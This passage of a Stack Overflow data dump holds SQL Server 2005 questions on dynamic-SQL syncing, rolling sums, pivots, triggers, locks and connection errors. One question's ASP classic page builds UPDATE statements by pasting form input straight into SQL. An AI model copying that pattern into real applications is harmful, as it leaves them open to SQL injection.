CONSTRAINT [FK_rml_re_consumermarkets_rml_re_consumercrops]\n        ALTER TABLE [dbo].[rml_re_consumermarkets] DROP CONSTRAINT [FK_rml_re_ConsumerSubscriptionMarket_rml_re_ConsumerSubscriptionData]\n        ALTER TABLE [dbo].[rml_re_consumercrops] DROP CONSTRAINT [FK_rml_re_ConsumerSubscriptionCrops_rml_re_ConsumerSubscriptionData]\n\n        TRUNCATE TABLE rml_re_consumermarkets\n        TRUNCATE TABLE rml_re_consumercrops\n        TRUNCATE TABLE rml_re_ConsumerSubscriptionData\n\n    ALTER TABLE [dbo].[rml_re_consumercrops]  WITH NOCHECK ADD  CONSTRAINT [FK_rml_re_ConsumerSubscriptionCrops_rml_re_ConsumerSubscriptionData] FOREIGN KEY([subscriptionid])\n    REFERENCES [dbo].[rml_re_ConsumerSubscriptionData] ([id])\n    ALTER TABLE [dbo].[rml_re_consumermarkets]  WITH NOCHECK ADD  CONSTRAINT [FK_rml_re_ConsumerSubscriptionMarket_rml_re_ConsumerSubscriptionData] FOREIGN KEY([subscriptionid])\n    REFERENCES [dbo].[rml_re_ConsumerSubscriptionData] ([id])\n    ALTER TABLE [dbo].[rml_re_consumermarkets]  WITH CHECK ADD  CONSTRAINT [FK_rml_re_consumermarkets_rml_re_consumercrops] FOREIGN KEY([cropid])\n    REFERENCES [dbo].[rml_re_consumercrops] ([cropid])\n\n\n        SET @query='';\n        SET @query= 'INSERT INTO rml_re_ConsumerSubscriptionData(id,msisdn,consumername,\n                    languagetype,statecode,talukcode,districtcode,regioncode,status,\n                    subscriptionstartdate,subscriptionenddate,DistributorCode,\n                    package,soiltype,comp_category,AdditionalInfo) \n                            SELECT  id,msisdn,\n                            case when Len(consumername) &lt;=150 then consumername else null end  as consumername,\n                            case when Len(languagetype) &lt;=10 then languagetype else null end  as languagetype ,'  \n        SET @query=@query+' case when Len(statecode) &lt;=5 then statecode else null end  as statecode ,\n                            case when Len(talukcode) &lt;=10 then talukcode else null end  as talukcode  ,\n                            case when Len(districtcode) &lt;=10 then districtcode else null end  as districtcode,\n                            case when Len(regioncode) &lt;=10 then regioncode else null end  as regioncode ,\n                            case when Len(status) &lt;=50 then status else null end  as status ,\n                            subscriptionstartdate ,'  \n        SET @query=@query+' subscriptionenddate,\n                            case when Len(DistributorCode) &lt;=100 then DistributorCode else null end as DistributorCode ,\n                            case when Len(package) &lt;=50 then package else null end AS package ,\n                            case when Len(soiltype) &lt;=50 then soiltype else null end   as soiltype,'  \n        SET @query=@query+' case when Len(comp_category) &lt;=50 then comp_category  else null end  as comp_category  ,\n                            case when Len(AdditionalInfo) &lt;=100 then AdditionalInfo  else null end  as AdditionalInfo '  \n        SET @query=@query+' FROM '  \n        SET @query=@query+' ['+@dbServerName+'].'+@databaseName+'.'+@dbUserName+'.rml_re_getConsumerSubscriptionData_New '\n        SET @query=@query+' WHERE crop1code is not null AND crop2code is not null '\n\n\n\n        EXEC (@query)  \n        SET @query='';\n        -- INSERT FOR rml_re_consumercrops\n        --INSER FOR PRIMARY CROP\n        SET @query='INSERT INTO rml_re_consumercrops(subscriptionid,commoditycode,sowingdate,sowingweek)'\n        SET @query=@query+'SELECT id,case when Len(crop1code) &lt;=15 then crop1code  else null end  as crop1code ,sowingdate1,DATEDIFF (WEEK,sowingdate1,getdate()) '\n        SET @query=@query+' FROM '\n        SET @query=@query+' ['+@dbServerName+'].'+@databaseName+'.'+@dbUserName+'.rml_re_getConsumerSubscriptionData_New '\n        SET @query=@query+' WHERE crop1code is not null AND crop2code is not null'\n\n\n        EXEC (@query)  \n        SET @query=''\n        --INSER FOR SECONDARY CROP\n        SET @query='INSERT INTO rml_re_consumercrops(subscriptionid,commoditycode,sowingdate,sowingweek)'\n        SET @query=@query+'SELECT id,case when Len(crop2code) &lt;=15 then crop2code  else null end  as crop2code  ,sowingdate2,DATEDIFF (WEEK,sowingdate2,getdate()) '\n        SET @query=@query+'FROM '\n        SET @query=@query+' ['+@dbServerName+'].'+@databaseName+'.'+@dbUserName+'.rml_re_getConsumerSubscriptionData_New '\n        SET @query=@query+' WHERE crop1code is not null AND crop2code is not null'\n\n        EXEC (@query)  \n        SET @query=''\n\n        --INSERT FOR rml_re_consumermarkets\n        --INSER FOR PRIMARY CROP\n        SET @query='INSERT INTO rml_re_consumermarkets(cropid,subscriptionid,marketcode,ric)'\n        SET @query=@query+'SELECT CS.cropid,E.id,case when Len(M.item) &lt;=15 then M.item  else null end AS marketcode ,case when Len( R.item) &lt;=15 then  R.item  else null end  AS ric '\n        SET @query=@query+'FROM rml_re_consumercrops CS,'\n        SET @query=@query+' ['+@dbServerName+'].'+@databaseName+'.'+@dbUserName+'.rml_re_getConsumerSubscriptionData_New  E ' \n        SET @query=@query+' OUTER APPLY fnSplit(E.Ric1,'+''','''+') R,'\n        SET @query=@query+' ['+@dbServerName+'].'+@databaseName+'.'+@dbUserName+'.rml_re_getConsumerSubscriptionData_New  F '\n        SET @query=@query+' OUTER APPLY fnSplit(F.MandiCode1,'+''','''+') M '\n        SET @query=@query+' WHERE F.ID = E.ID \n                AND R.ID = M.ID\n                AND CS.commoditycode = E.crop1code\n                AND CS.subscriptionid=E.id \n                AND CS.subscriptionid=F.id '\n        SET @query=@query+' AND E.crop1code is not null AND E.crop2code is not null'\n        SET @query=@query+' AND F.crop1code is not null AND F.crop2code is not null'\n\n        EXEC (@query)  \n        SET @query=''\n        --INSER FOR SECONDARY CROP\n        SET @query='INSERT INTO rml_re_consumermarkets(cropid,subscriptionid,marketcode,ric) '\n        SET @query=@query+'SELECT CS.cropid,E.id,case when Len(M.item) &lt;=15 then M.item  else null end AS marketcode,case when Len( R.item) &lt;=15 then R.item  else null end AS ric  '\n        SET @query=@query+'FROM rml_re_consumercrops CS,'\n        SET @query=@query+' ['+@dbServerName+'].'+@databaseName+'.'+@dbUserName+'.rml_re_getConsumerSubscriptionData_New  E '\n        SET @query=@query+' OUTER APPLY fnSplit(E.Ric2,'+''','''+') R,'\n        SET @query=@query+' ['+@dbServerName+'].'+@databaseName+'.'+@dbUserName+'.rml_re_getConsumerSubscriptionData_New  F ' \n        SET @query=@query+' OUTER APPLY fnSplit(F.MandiCode2,'+''','''+') M '\n        SET @query=@query+' WHERE F.ID = E.ID \n              AND R.ID = M.ID\n              AND CS.commoditycode = E.crop2code\n              AND CS.subscriptionid=E.id \n              AND CS.subscriptionid=F.id '\n        SET @query=@query+' AND E.crop1code is not null AND E.crop2code is not null'\n        SET @query=@query+' AND F.crop1code is not null AND F.crop2code is not null'\n\n    EXEC (@query)       \n    COMMIT TRANSACTION PULLCONSUMERDATA  \n    UPDATE  rml_re_consumerdatasync_log SET status='completed',endtime=getdate() WHERE logdate=@currenttime  \n  END TRY  \n  BEGIN CATCH  \n  --  ROLLBACK TRANSACTION PULLCONSUMERDATA  \n\n    UPDATE  rml_re_consumerdatasync_log SET status='failure',error_info=ERROR_MESSAGE() WHERE logdate=@currenttime  \n  END CATCH  \n\nEND  \n\n--exec rml_re_GetAndStoreConsumerSubscriptionData\n\n\n\nGO\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":181,"score":0,"question_id":10703711,"title":"count/select query in MS Sql Server 2005","body":"<p>I have a legacy table that contains 'master' records and associated detail records. Detail records are identified by an addition to the master key of \"-nnn\". I need to find master records that have no detail records, tried several variations, and then finally broke it down to simplest elements.</p>\n\n<p>This works:</p>\n\n<pre><code>select (select count(*) from dbo.client as cl2 \n    where cl2.acct_no like (cl1.acct_no + '-%')) as countx, acct_no \nfrom dbo.client as cl1\n</code></pre>\n\n<p>and displays the expected zero or non-zero results, depending on how many detail records there are.</p>\n\n<p>However, when I try to use the count results to select only the records with zero detail records, like so:</p>\n\n<pre><code>select (select count(*) from dbo.client as cl2 \n    where cl2.acct_no like (cl1.acct_no + '-%')) as countx, acct_no \nfrom dbo.client as cl1 \nwhere countx = 0\n</code></pre>\n\n<p>I get an error: \"Invalid column name 'countx'\"</p>\n\n<p>What am I missing here?</p>\n"},{"tags":["wcf","entity-framework","sql-server-2005","iis7","wcf-data-services"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":286,"score":0,"question_id":10700756,"title":"WCF web service, Entity Framework and keeping SQL sessions alive (slow first start!)","body":"<p>I have a WCF web service hosted on IIS 7. This web service serves up JSON content for use in mobile apps. It uses the Entity Framework on top of MS SQL 2005, and the Interface contract looks like the below:</p>\n\n<pre><code>   [ServiceContract]\n    public interface MyService\n    {\n        [WebInvoke(Method = \"GET\", UriTemplate = \"/GetStuff?skip={skip}&amp;take={take}&amp;loanAmt={loanAmt}&amp;propertyVal={propertyVal}&amp;Term={Term}&amp;MonthlyRent={MonthlyRent}\", RequestFormat = WebMessageFormat.Json, ResponseFormat = WebMessageFormat.Json)]\n        [OperationContract]\n        ProductsDTO GetProducts(int skip, int take, decimal loanAmt, decimal propertyVal, int Term, decimal MonthlyRent);\n    }\n</code></pre>\n\n<p>The implementation looks like this:</p>\n\n<pre><code>    public ProductsDTO GetProducts(int skip, int take, decimal loanAmt, decimal propertyVal, int Term, decimal MonthlyRent)\n    {\n       //Some set up code\n      using (MyEntities context = new MyEntities()) \n        {\n              //Get our products\n        }\n\n     return ReturnedList\n    }\n</code></pre>\n\n<p>On the first run of this, it can take anywhere up to 15 seconds (unacceptable for a mobile app), on subsequent runs, the data comes back in under a second. After 5 minutes of inactivity, the WCF service reverts to taking 15 seconds to start. </p>\n\n<p>I initially thought the bottle neck was at IIS7 and thought my App Pool was shutting off. After setting the App Pool to never recycle and studying w3wp.exe processes on the IIS server, I realized this was not the case. It is the database session that is shutting off after those five minutes.</p>\n\n<p>This being the case, I want to hold a SQL session open to immediately serve up requests from the WCF application, however, I don't want to set the Entity Context as a singleton or leave this open in the service as I understand this is poor practise. I could pass a SQL connection object TO the context (using (MyEntities context = new MyEntities(MySQLConnection))) and hold that open? Or can someone suggest something else? </p>\n\n<p>I had seen lots of posts with scripts that touch the web service to keep it alive which gave me the creeping horrors, so have avoided going down this route. </p>\n\n<p>What are your thoughts?</p>\n\n<p><strong>Update 1</strong> </p>\n\n<p>As per Andomars response, I have added the following initialization code to the WCF service.</p>\n\n<pre><code>   public Service1()\n        {\n            // Blocking call that initializes\n            // the service instance\n            this.Initialize();\n        }\n\n        BackgroundWorker KeepSQLAlive = new BackgroundWorker();\n\n        private void Initialize()\n        {\n            KeepSQLAlive.DoWork += new DoWorkEventHandler(KeepSQLAlive_DoWork);\n\n            KeepSQLAlive.RunWorkerAsync();\n        }\n\n        void KeepSQLAlive_DoWork(object sender, DoWorkEventArgs e)\n        {\n            Timer pingback = new Timer(180000);\n\n            pingback.Elapsed += new ElapsedEventHandler(pingback_Elapsed);\n\n            pingback.Start();\n        }\n\n        void pingback_Elapsed(object sender, ElapsedEventArgs e)\n        {\n            using (MyEntities context = new MyEntities ())\n            {\n                context.ExecuteStoreCommand(\"select @@servername\");\n            }\n        }\n</code></pre>\n\n<p>This feels like a bit of a fudge, and I'm a bit worried without creating the service as a singleton the service will continue to spawn SQL sessions without ever killing any. However, if it works it is the path of least resistance as hosting this code in a windows service would take more time and I am unclear how to integrate this in with IIS security (I want to use SSL). I will report back whether the above works. (thanks for the assistance all)</p>\n"},{"tags":["sql-server","performance","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":300,"score":1,"question_id":10701406,"title":"T-SQL rolling twelve month per day performance","body":"<p>I have checked similar problems, but none have worked well for me. The most useful was <a href=\"http://forums.asp.net/t/1170815.aspx/1\" rel=\"nofollow\">http://forums.asp.net/t/1170815.aspx/1</a>, but the performance makes my query run for hours and hours.</p>\n\n<p>I have 1.5 million records based on product sales (about 10k product) over 4 years. I want to have a table that contains date, product and rolling twelve months sales. </p>\n\n<p>This query (from the link above) works, and shows what I want, but the perfomance makes it useless:</p>\n\n<pre><code>select day_key, product_key, price, (select sum(price) as R12 from #ORDER_TURNOVER as tb1 where tb1.day_key &lt;= a.day_key and tb1.day_key &gt; dateadd(mm, -12, a.day_key) and tb1.product_key = a.product_key) as RSum into #hejsan\nfrom #ORDER_TURNOVER as a\n</code></pre>\n\n<p>I tried a rolling sum cursor function for all records which was fast as lightning, but I couldn't get the query only to sum the sales over the last 365 days.</p>\n\n<p>Any ideas on how to solve this problem is much appreciated.\nThank you.</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":99,"score":2,"question_id":10698930,"title":"Sql Query to get the values based on % of input","body":"<p>I have a table like below</p>\n\n<pre><code> Board Component Cost\n\n    b1     c1       5\n    b1     c2       10\n    b2     c3       15\n    b3     c4       20\n    b3     c5       25\n    b4     C6       25\n  ---------------------\n                  100%\n</code></pre>\n\n<p>I shoud give the input to get the values from the table, say...</p>\n\n<p>If the input is 20%</p>\n\n<p>the output should be</p>\n\n<pre><code> Board Component Cost\n\n    b1      c1      5\n    b1      c2     10\n    b2      c3     15\n</code></pre>\n\n<p>If the input is 50%</p>\n\n<p>the output should be</p>\n\n<pre><code> Board Component Cost\n\n    b1      c1      5\n    b1      c2     10\n    b2      c3     15\n    b3      c4     20\n</code></pre>\n\n<p>and so on</p>\n\n<p>How to write the query in sql server</p>\n"},{"tags":["sql-server","sql-server-2005","pivot"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":3413,"score":1,"question_id":10699997,"title":"SQL Server - Transpose rows into columns","body":"<p>I've searched high and low for an answer to this so apologies if it's already answered!\nI have the following result from a query in SQL 2005:</p>\n\n<pre><code>ID\n\n1234\n\n1235\n\n1236\n\n1267\n\n1278\n</code></pre>\n\n<p>What I want is</p>\n\n<pre><code>column1|column2|column3|column4|column5\n---------------------------------------\n1234   |1235   |1236   |1267   |1278\n</code></pre>\n\n<p>I can't quite get my head around the pivot operator but this looks like it's going to be involved. I can work with there being only 5 rows for now but a bonus would be for it to be dynamic, i.e. can scale to x rows.</p>\n\n<p>EDIT:\nWhat I'm ultimately after is assigning the values of each resulting column to variables, e.g.</p>\n\n<pre><code>DECLARE @id1 int, @id2 int, @id3 int, @id4 int, @id5 int\n\nSELECT @id1 = column1, @id2 = column2, @id3 = column3, @id4 = column4, \n@id5 = column5 FROM [transposed_table]\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":11,"favorite_count":34,"up_vote_count":63,"down_vote_count":1,"view_count":72005,"score":62,"question_id":314824,"title":"T-SQL: Opposite to string concatenation - how to split string into multiple records","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2647/split-string-in-sql\">Split string in SQL</a>  </p>\n</blockquote>\n\n\n\n<p>I have seen <a href=\"http://stackoverflow.com/questions/tagged/concatenation+sql\">a couple of questions related to string concatenation</a> in SQL.\nI wonder how would you approach the opposite problem: splitting coma delimited string into rows of data:</p>\n\n<p>Lets say I have tables:</p>\n\n<pre><code>userTypedTags(userID,commaSeparatedTags) 'one entry per user\ntags(tagID,name)\n</code></pre>\n\n<p>And want to insert data into table</p>\n\n<pre><code>userTag(userID,tagID) 'multiple entries per user\n</code></pre>\n\n<p>Inspired by <a href=\"http://stackoverflow.com/questions/314682/which-tags-are-not-in-the-database\">Which tags are not in the database?</a> question</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>Thanks for the answers, actually more then one deserves to be accepted but I can only pick one, and the <a href=\"http://stackoverflow.com/questions/314824/t-sql-opposite-to-string-concatenation-how-to-split-string-into-multiple-records#314917\">solution presented by Cade Roux</a> with recursions seems pretty clean to me. It works on SQL Server 2005 and above. </p>\n\n<p>For earlier version of SQL Server the solution <a href=\"http://stackoverflow.com/questions/314824/t-sql-opposite-to-string-concatenation-how-to-split-string-into-multiple-records#314833\">provided by miies</a> can be used. \nFor working with text data type <a href=\"http://stackoverflow.com/questions/314824/t-sql-opposite-to-string-concatenation-how-to-split-string-into-multiple-records#314866\">wcm answer</a> will be helpful. Thanks again.</p>\n"},{"tags":["sql-server-2005","function","rank"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":10686052,"title":"SQL Server 2005 RANK function","body":"<p>I have a problem in SQL Server 2005:</p>\n\n<p>Suppose I have the table <code>PLAYER</code> (<code>string player, int score, bool Active</code>) and the this query :</p>\n\n<pre><code>SELECT PLAYER.player AS NAME,\n   PLAYER.score AS SCORE,\n   POSITION = CASE WHEN PLAYER.Active THEN RANK()OVER(ORDER BY score desc) else NULL end\nfrom PLAYER\n</code></pre>\n\n<p>The problem is that when the player is not active, the positions generated are not consecutive. </p>\n\n<p>For example :</p>\n\n<pre><code>JOHN,10000,1\nPETER,5000,NULL (NOT ACTIVE)\nCHARLES,2500,3 (SHOULD HAVE POSITION 2, NOT 3)\n</code></pre>\n\n<p>Sorry for my terrible English, I hope I have explained my point</p>\n"},{"tags":["sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":174,"score":0,"question_id":10696147,"title":"Select from another table within an Insert Trigger","body":"<p>I am maintaining an audit table, where in I have a parent table and it's child table.I want to insert the primary key of the parent audit table into it's child audit table.<br>\nShould I be declaring a <strong>\"before insert\"</strong> instead of a <strong>\"for insert\"</strong> trigger. Here's my code: </p>\n\n<pre><code>CREATE trigger [trgAudtblChild] On [tblChild]\nfor Insert \nas\nBEGIN\n\ndeclare @serNo  bigint \ndeclare @expSerNo  int \ndeclare @postPercent  numeric  (12, 2) \ndeclare @prdSAPid  varchar  (50) \ndeclare @lastUpdatedBy  int \ndeclare @lastUpdatedOn  smalldatetime \n\nSELECT \n --@serno = serno,\n @expSerNo = expSerNo ,\n @postPercent = postPercent ,\n @prdSAPid = prdSAPid ,\n @lastUpdatedBy = lastUpdatedBy ,\n @lastUpdatedOn = lastUpdatedOn\nFROM INSERTED\n\nselect @serno = max(at_serno) from AT_tblParent\n\ninsert into AT_tblChild(serNo, expSerNo, postPercent\n                       , prdSAPid, lastUpdatedBy, lastUpdatedOn\n                       , change_column_index) values(\n                                  @serNo, @expSerNo, @postPercent\n                          , @prdSAPid, @lastUpdatedBy, @lastUpdatedOn\n                          , 'INSERTED')\n\nEnd\nReturn\n</code></pre>\n\n<p>The above code, does not work and puts the table into transaction.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","database-design"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":949,"score":4,"question_id":9039455,"title":"Should I use SQL_Variant data type?","body":"<p>using SQL Server 2005 with SP4 and I am designing a database table. </p>\n\n<p>Here is the table DDL</p>\n\n<pre><code>CREATE TABLE CPSync4D.ProjectProfilerOption\n(\n    ProjectProfilerOptionID     INT  IDENTITY(1,1) CONSTRAINT PK_ProjectProfilerOption_ProjectProfilerOptionID PRIMARY KEY \n   ,ProjectID                   INT  CONSTRAINT FK_ProjectProfilerOption_Project_ProjectID FOREIGN KEY(ProjectID) REFERENCES CPSync4D.Project(ProjectID) ON DELETE CASCADE\n   ,ProfilerOptionID            TINYINT CONSTRAINT FK_ProjectProfilerOption_ProfilerOption_ProfilerOptionID  FOREIGN KEY(ProfilerOptionID) REFERENCES CPSync4D.ProfilerOption (ProfilerOptionID) \n   ,ProfilerOptionValue         sql_variant  NOT NULL   \n\n)\nGo\n</code></pre>\n\n<p>profileroptionvalue column can hold either a string upto 30 characters, integer or decimal values  e.g. values are \"ProfilerValueType\", or 12.52 or 20 etc. (no more than than two decimals and integer values are less than 100)</p>\n\n<p>Should I use sql_variant or varchar(30)...? I never used sql_variant before and not sure any implication of not using in terms of database design.</p>\n\n<p>Any pitfalls of using sql_variant...with .net code</p>\n"},{"tags":["sql","sql-server","query","sql-server-2005","grouping"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":235,"score":4,"question_id":10678997,"title":"SQL server 2005 group by with same column but different date and time?","body":"<p>everyone ...currently i have a table as below ..</p>\n\n<pre><code>DATE               BATCHNO     PRODCODE\n----------------------------------------------\n31/12/2009 23.53    10859       2003P\n01/01/2010 00.04    10860       2003P\n01/01/2010 00.06    10861       2003P\n01/01/2010 00.13    10862       2003P\n01/01/2010 00.30    10863       1259\n01/01/2010 03.02    10864       639B\n01/01/2010 03.13    10865       639B\n01/01/2010 03.20    10866       639B\n01/01/2010 04.13    10867       2003P\n01/01/2010 04.20    10868       2003P\n01/01/2010 04.30    10863       2003P\n</code></pre>\n\n<p>above is the example of the table i have now.. the DATE is generated whenever there are new BATCHNO and the BATCHNO is increase by 1 .. the PRODCODE is the code of the product where machine manufacture the product and let say product 2003P finished manufactured, it will automatically go for another product such as 1259...</p>\n\n<p>i would like to compute those data into the below desired result:</p>\n\n<pre><code>DATE               PRODCODE\n----------------------------------------------\n31/12/2009 23.53     2003P\n01/01/2010 00.13     2003P\n01/01/2010 00.30     1259\n01/01/2010 00.30     1259\n01/01/2010 03.02     639B\n01/01/2010 03.20     639B  \n01/01/2010 04.13     2003P\n01/01/2010 04.30     2003P\n</code></pre>\n\n<p>meaning that 31/12/2009 23.53 is the start time for the product 2003P and 01/01/2012 00.13 is the stop time for product 2003P.. and for product 1259 is special because 01/01/2010 00.30 only produce 1 product before move to other product..basically i cant use group by because it will group by all the product which are the same code .. the problem is that detect the start time and stop time for the particular product code. . how can this be accomplished? and this is for SQL SERVER 2005 ... </p>\n\n<p>thanks everyone .. </p>\n"},{"tags":["sql","sql-server","database","sql-server-2005"],"answer_count":5,"favorite_count":14,"up_vote_count":24,"down_vote_count":0,"view_count":79556,"score":24,"question_id":694581,"title":"How to check which locks are held on a table","body":"<p>How can we check which database locks are applied on which rows against a query batch? \nAny tool that highlights table row level locking in real time? </p>\n\n<p>DB: SQL Server 2005</p>\n"},{"tags":["sql-server-2005","asp-classic"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":10679717,"title":"Why I can't edit the record using ASP and SQL Server?","body":"<p>I have a web application using ASP classic and SQL Server 2005.</p>\n\n<p>When I try to edit the record, the web page shows <code>HTTP 500 - Internal server error</code>. I try to tracking the error and I think the problem comes from FORM ACTION directory.</p>\n\n<p>here's my form declaration:</p>\n\n<pre><code>&lt;form name=\"frmEdit\" method=\"post\" action=\"/dairypo/master/tpl/queries/qupdate.asp\" \n      onsubmit=\"return CheckOtherInfo();\"&gt;\n</code></pre>\n\n<p>here is on qupdate.asp:</p>\n\n<pre><code>&lt;!-- #include file=\"../../../include/createconnection.asp\" --&gt;\n&lt;%\n    act = 1\n    if trim(request.form(\"chkAct\")) = \"\" then\n        act = 0\n    end if\n    curid = trim(request.form(\"hdnId\"))\n    nprice = cDbl(request.form(\"txtPrice\"))\n    nprice_big = cDbl(request.form(\"txtPrice_Big\"))\n    nrate = cDbl(request.form(\"txtRate\"))\n    csatuan_big = trim(request.form(\"selOrdSatuan1\"))\n    csatuan = trim(request.form(\"selOrdSatuan2\"))\n\n    objCommand_1.commandText = \" SELECT nkonversi FROM ms_metriks WHERE csatuan1 = '\" &amp; csatuan_big &amp; \"' AND csatuan2 = '\" &amp; csatuan &amp; \"' \"\n    set qMetriks = objCommand_tpl.execute\n    nkonversi = 1\n    if NOT qMetriks.BOF then\n        nkonversi = cDbl(qMetriks(\"nkonversi\"))\n    end if\n    if nprice_big&lt;&gt;0 AND nprice=0 then\n        nprice = nprice_big/nkonversi\n    elseif nprice_big=0 AND nprice&lt;&gt;0 then\n        nprice_big = nprice*nkonversi\n    end if\n    objCommand_tpl.commandText = \"UPDATE ms_tpl SET \" &amp;_\n                            \"   dlastupdate = '\" &amp; date() &amp; \"', \" &amp;_\n                            \"   ctipejual = '\" &amp; trim(request.form(\"selBy\")) &amp; \"',\" &amp;_\n                            \"   ckdgruprelasi = '\" &amp; trim(request.form(\"selgCust\")) &amp; \"', \" &amp;_\n                            \"   ckdrelasi = '\" &amp; trim(request.form(\"selCust\")) &amp; \"', \" &amp;_\n                            \"   dtglvalidawal = '\" &amp; trim(request.form(\"txtDate1\")) &amp; \"', \" &amp;_\n                            \"   dtglvalidakhir = '\" &amp; trim(request.form(\"txtDate2\")) &amp; \"', \" &amp;_\n                            \"   ckdcurrency = '\" &amp; trim(request.form(\"selCurr\")) &amp; \"', \" &amp;_\n                            \"   nhargaperiod = \" &amp; nprice &amp; \", \" &amp;_\n                            \"   nhargaperiodmax = \" &amp; nprice &amp; \", \" &amp;_\n                            \"   nharga1 = \" &amp; nprice &amp; \", \" &amp;_\n                            \"   nharga2 = \" &amp; nprice_big &amp; \", \" &amp;_\n                            \"   csatuan1 = '\" &amp; csatuan &amp; \"', \" &amp;_\n                            \"   csatuan2 = '\" &amp; csatuan_big &amp; \"', \" &amp;_\n                            \"   nrate = \" &amp; nrate &amp; \", \" &amp;_\n                            \"   bactive = \" &amp; act &amp; \", \" &amp;_\n                            \"   ckdwilayah = '\" &amp; trim(request.form(\"selLok\")) &amp; \"' \" &amp;_\n                            \" WHERE id = \" &amp; curid &amp; \" \"\n    set qUpdateRelasi = objCommand_tpl.Execute\n\n    objCommand_tpl.commandText = \"INSERT INTO ms_tplhist \"&amp;_\n                               \"( cUserId, dLastUpdate,ctipejual,cKdUnitKey, cKdGrupRelasi, cKdRelasi, cKdBarang, bIsFluc, cSatPeriod, \"&amp;_\n                               \"  nHargaPeriod,dTglValidAwal, dTglValidAkhir, cKdCurrency,cSatuan1,cSatuan2, nHarga1, nHarga2,nRate, bActive ) \"&amp;_  \n                               \"SELECT cUserId, dLastUpdate,ctipejual,cKdUnitKey, cKdGrupRelasi, cKdRelasi, cKdBarang, bIsFluc, cSatPeriod, \"&amp;_\n                               \"  nHargaPeriod,dTglValidAwal, dTglValidAkhir, cKdCurrency,cSatuan1,cSatuan2, nHarga1, nHarga2,nRate, bActive \"&amp;_\n                               \"FROM ms_tpl \"&amp;_\n                               \" WHERE id = \" &amp; curid &amp; \" \"\n    set qBackupData = objCommand_tpl.Execute            \n%&gt;\n\n&lt;form name=\"frmControl\" action=\"/dairypo/homepage.asp?contID=mstpl_idxs\" method=\"post\"&gt;\n&lt;%\n    for each form in request.form\n        response.write \"&lt;input type=\"\"hidden\"\" name=\"\"\" &amp; form &amp; \"\"\" value=\"\"\" &amp; request.form(form) &amp; \"\"\"&gt;\" &amp; vbcrlf\n    next\n%&gt;  \n&lt;/form&gt;\n&lt;script&gt;\n    document.frmControl.submit()\n&lt;/script&gt;\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":10651077,"title":"Retrieve the last month rows from table","body":"<p>I have a problem regarding fetching the data of the last one month. </p>\n\n<p>As my table doesn't have any <code>DateTime</code> column, is there is any chance to get the last one month's rows from the table?</p>\n"},{"tags":["sql-server-2005","query","schema"],"answer_count":3,"favorite_count":1,"up_vote_count":14,"down_vote_count":0,"view_count":6636,"score":14,"question_id":226042,"title":"How do I query if a database schema exists","body":"<p>As part of our build process we run a database update script as we deploy code to 4 different environments (due to crazy business rules, but that's another post).  Further, since the same query will get added to until we drop a release into production (yet a few more domains to add to... frustrating); it HAS to be able to run multiple times on a given database.  Like this:</p>\n\n<pre><code>IF NOT EXISTS (SELECT * FROM sys.tables WHERE object_id = OBJECT_ID(N'[Table]'))\nBEGIN\n  CREATE TABLE [Table]\n  (...)\nEND\n</code></pre>\n\n<p>Currently, I have a create schema statement in the deployment/build script.  Where do I query for the existence of a schema?</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":201,"score":2,"question_id":10683954,"title":"Connecting installed C# application to local SQL Server 2005 Express - User not associated with trusted sql connection","body":"<p>(I know there's a ton of questions like this on the web and I've spent several days now trying to solve this, but I'm not getting anywhere. I'm new to this so bear with me please)</p>\n\n<p><strong>1. The problem</strong></p>\n\n<p>After installing my application, SQL Server 2005 Express on my friends computer (Vista Home Premium) and attaching the database (mdf file) to the new SQL server whenever I launch my application or open a new form (C# windows form) inside the application I get the following message:</p>\n\n<blockquote>\n  <p>System.Data.SqlClient.SqlException: Login failed for user ''. The user\n  is not associated with a trusted SQL Server connection.</p>\n</blockquote>\n\n<p>If I click \"continue\" I can read/write to the database and the application works as expected (untill I open a new form and i get the same message again).</p>\n\n<p><strong>2. So this is what I've done so far:</strong></p>\n\n<p>I've turned \"SQL Server and Windows Authentication mode\" on since I've seen that being suggested in many threads, but it doesn't help.</p>\n\n<p>My current connection string: </p>\n\n<blockquote>\n  <p>\"Data Source=.\\SQLEXPRESS;Initial Catalog=pj;Integrated\n  Security=SSPI;\"</p>\n</blockquote>\n\n<p>Since my connection string contains \".\\SQLEXPRESS\" it will try to connect with \"computer-name\\username\", in my case \"TONY-COMPUTER\\TONY\", so I added a SQL user with that name together with role memberships db_datareader and db_datawriter to be able to read/write to DB.</p>\n\n<p>I also tried with a connection string like: </p>\n\n<blockquote>\n  <p>\"Data Source=.\\SQLEXPRESS;Initial Catalog=pj;User\n  Id=Tony;Password=123;\"</p>\n</blockquote>\n\n<p>Then added the SQL user \"Tony\".</p>\n\n<p>But I keep getting the same error. What puzzles me is that there's no user name in the error message, I'd expect to see \"TONY-COMPUTER\\TONY\" or \"Tony\" but it's blank.</p>\n\n<p>Any help much appreciated!</p>\n\n<p>/Tony</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":251,"score":0,"question_id":10691160,"title":"Execute SQL from external file without opening it in 